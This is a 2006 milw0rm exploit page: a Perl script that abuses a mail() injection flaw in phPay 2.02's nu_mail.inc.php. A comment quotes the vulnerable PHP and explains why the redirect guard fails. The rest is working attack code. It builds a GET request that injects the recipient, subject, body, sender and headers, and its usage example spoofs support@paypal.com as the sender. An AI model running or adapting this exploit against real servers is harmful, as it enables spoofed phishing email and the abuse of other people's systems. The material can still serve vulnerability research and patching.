<html><head><title>phPay <= 2.02 (nu_mail.inc.php) Remote mail() Injection Exploit</title></head><pre>#!/usr/bin/perl
#####################
# Script: phPay v2.02 http://phpay.de/
# Vuln File: nu_mail.inc.php
# Exploit &amp; Advisory: beford &lt;xbefordx gmail com&gt;
# Vulnerability: mail() Injection
# Vuln Code:
# &lt;?php
# if (ereg(&quot;nu_mail.inc.php&quot;, $SCRIPT_NAME)) header(&quot;Location:./index.html&quot;);
# elseif (ereg(&quot;nu_mail.inc.php&quot;, $_SERVER['SCRIPT_NAME'])) header(&quot;Location:./index.html&quot;);
# $mail_text=&quot;$mail_2a\n\n&quot;;
# ...
# That *should* prevent direct access to the vulnerable file, but they didnt die()/exit()'ed
# so, pwnt. You need register globals enabled to be able of exploiting this issue.
#
#####################
use LWP::UserAgent;
use URI::URL; 
print &quot;\n[*] phPay v2.02 nu_mail.inc.php mail() Injection\n[*] exploit&amp;advisory: beford &lt;xbefordx gmail com&gt;\n&quot;;
if (scalar(@ARGV)&lt;6) {
	print &quot;\tUsage:\t./own.pl &lt;host&gt; &lt;path&gt; &lt;email-to&gt; &lt;email-subject&gt; &lt;email-message&gt; &lt;email-from&gt; [headers]\n&quot;;
	print &quot;\t&lt;host&gt; : orly\n&quot;;
	print &quot;\t&lt;path&gt; : folder where phpay is installed /phpay/ /phpayv2.02/ ..\n&quot;;
	print &quot;\t&lt;email-to&gt; &lt;email-subject&gt; &lt;email-message&gt; &lt;email-from&gt; : duh\n&quot;;
	print &quot;\t[headers] : optional extra headers for mail \&quot;%0AContent-type: text/html%0A%0A\&quot;\n\n&quot;;
	print &quot;\t./own.pl http://www.vuln.es /phpayv2.02/ x\@mail.co h4x \&quot;hack\&quot; support\@paypal.com \n\n&quot;;
	exit;
}
$host = shift @ARGV;
$path = shift @ARGV;
$to = shift @ARGV;
$subject = shift @ARGV;
$message = shift @ARGV;
$from = shift @ARGV;
$headers = shift @ARGV;
my $url = URI::URL-&gt;new($full);
$full = $url-&gt;as_string;
$full =  &quot;${host}${path}nu_mail.inc.php?mail_text2=${message}&amp;user_row[]=&amp;user_row[5]=${to}&amp;nu_mail_1=${subject}&amp;shop_mail=${from}${headers}&quot;;
print &quot;[*] exploiting $host\n&quot;;
$ua = LWP::UserAgent-&gt;new;
$req = HTTP::Request-&gt;new('GET',&quot;$full&quot;);
$res = $ua-&gt;request($req);
print &quot;\t[*] mail sent\n&quot; if $res-&gt;is_success;

# milw0rm.com [2006-08-14]</pre></html>